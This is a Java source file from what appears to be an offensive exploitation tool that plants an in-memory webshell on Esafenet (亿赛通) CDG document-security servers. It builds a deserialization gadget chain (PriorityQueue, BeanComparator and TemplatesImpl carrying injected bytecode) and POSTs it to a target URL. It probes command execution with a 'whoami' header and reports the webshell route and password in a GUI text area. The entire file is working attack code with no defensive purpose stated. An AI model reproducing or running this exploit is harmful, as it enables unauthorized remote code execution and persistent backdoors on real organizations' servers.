package Memshell;

import core.MemShellInterface;
import decrypt.esafenet.ServiceUtil;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import yso.payloads.CommonsCollections6NC;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;

public class esafenet_Inject_Memshell implements MemShellInterface {
    private static byte[] bytes;


    @Override
    public Boolean inject(String url,String interF,String type,int dirtyN,String[] array, TextArea textArea_memshell) {
        return esafeInject(url,interF,type,dirtyN,array,textArea_memshell);
    }

    @Override
    public Boolean injectPrint(String type,String interFace,String PrintType, int dirtyN, String[] array, TextArea textArea_memshell) {
        return esafeInjectPrint(type,interFace,PrintType, dirtyN, array, textArea_memshell);
    }

    private Boolean esafeInjectPrint(String type,String interFace,String PrintType,int dirtyN,String[] array, TextArea textArea){
        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization","true");
        try {
            byte[] var = new sun.misc.BASE64Decoder().decodeBuffer(array[0]);

            HashMap head = new HashMap();
            head.put("Content-type","application/text");
            if(array.length == 4){
                if(array[2].contains("cmd")){
                    head.put("cmd","whoami");
                }
            }
            String print = AllMemPrint.getMemPrint("亿赛通",var, PrintType);
            if(PrintType=="source"){
                if(array.length == 4 &&array[2] != "define"){
                    if(array[2].contains("cmd")){
                        Platform.runLater(() -> {
                            textArea.appendText("\n"+type+"内存马payload("+PrintType+")生成成功！\n"+"请求头: "+array[2]+"\n密码: "+array[3]+"\n\n"+print);
                        });
                    }else{
                        Platform.runLater(() -> {
                            textArea.appendText("\n"+type+"内存马payload("+PrintType+")生成成功！\n"+"路由: /CDGServer3/R4gApt\n请求头: "+array[2]+"\n密码: "+array[3]+"\n\n"+print);
                        });
                    }
                }else{
                    Platform.runLater(() -> {
                        textArea.appendText("\n自定义class字节payload("+PrintType+")生成成功！\n\n\n"+print);

                    });
                }
            }else{
                Platform.runLater(() -> {
                    textArea.appendText("\n亿赛通仅支持source输出\n");
                });
            }
            return true;
        }catch (Exception e){
            return false;
        }
    }

    private boolean esafeInject(String url,String interFace,String type,int dirtyN,String[] array,TextArea textArea){
        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization","true");
        try {

            String var = getXMLPayload(array[0]);
            HashMap head = new HashMap();
            head.put("Content-type","application/text");
            if(array.length == 4){
                if(array[2].contains("cmd")){
                    head.put("cmd","whoami");
                }
            }
            Response res = HttpTools.post(url+interFace,var,head,"gbk");
            String result = res.getText();
            if(res.getCode()!=404) {
                if (array.length == 4 && array[2]!="define") {
                    if(array[2].contains("cmd")){
                        if(!result.isEmpty()||result!=null){
                            Platform.runLater(() -> {
                                textArea.appendText("\n" + type + " 内存马注入成功！\nurl: " + url +interFace+ "\n请求头: " + array[2] + "\n密码: " + array[3]+"\n回显: "+result.split("\n")[0]);
                            });
                        }else{
                            Platform.runLater(() -> {
                                textArea.appendText("\n" + type + " 内存马注入成功！\nurl: " + url +interFace+ "\n请求头: " + array[2] + "\n密码: " + array[3]+"\n回显失败");
                            });
                        }

                    }else{
                        Platform.runLater(() -> {
                            textArea.appendText("\n" + type + " 内存马注入完成，请自行连接判断！\nurl: " + url + "/CDGServer3/R4gApt\n请求头: " + array[2] + "\n密码: " + array[3]);
                        });
                    }

                } else {
                    Platform.runLater(() -> {
                        textArea.appendText("\n" + " 自定义classbyte注入成功！");
                    });
                }
                return true;
            }else{
                Platform.runLater(() -> {
                    textArea.appendText("\n"+type+" 注入失败！");
                });
                return false;
            }

        }catch (Exception e){
            Platform.runLater(() -> {
                textArea.appendText("\n"+type+" 注入失败！");
            });
            return false;
        }
    }

    static String getXMLPayload(String bin){
        String payload = "<java.util.PriorityQueue serialization=\"custom\">\n" +
                "  <unserializable-parents/>\n" +
                "  <java.util.PriorityQueue>\n" +
                "    <default>\n" +
                "      <size>2</size>\n" +
                "      <comparator class=\"org.apache.commons.beanutils.BeanComparator\">\n" +
                "        <property>outputProperties</property>\n" +
                "        <comparator class=\"java.lang.String$CaseInsensitiveComparator\"/>\n" +
                "      </comparator>\n" +
                "    </default>\n" +
                "    <int>3</int>\n" +
                "    <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl serialization=\"custom\">\n" +
                "      <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\n" +
                "        <default>\n" +
                "          <__name>P</__name>\n" +
                "          <__bytecodes>\n" +
                "           <byte-array>"+bin+"</byte-array>\n" +
                "          </__bytecodes>\n" +
                "          <__transletIndex>-1</__transletIndex>\n" +
                "          <__indentNumber>0</__indentNumber>\n" +
                "        </default>\n" +
                "        <boolean>false</boolean>\n" +
                "      </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\n" +
                "    </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\n" +
                "    <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl reference=\"../com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"/>\n" +
                "  </java.util.PriorityQueue>\n" +
                "</java.util.PriorityQueue>";
        try {
            return ServiceUtil.changeXMLInfo(payload);
        } catch (Exception e) {

        }
        return null;
    }

}
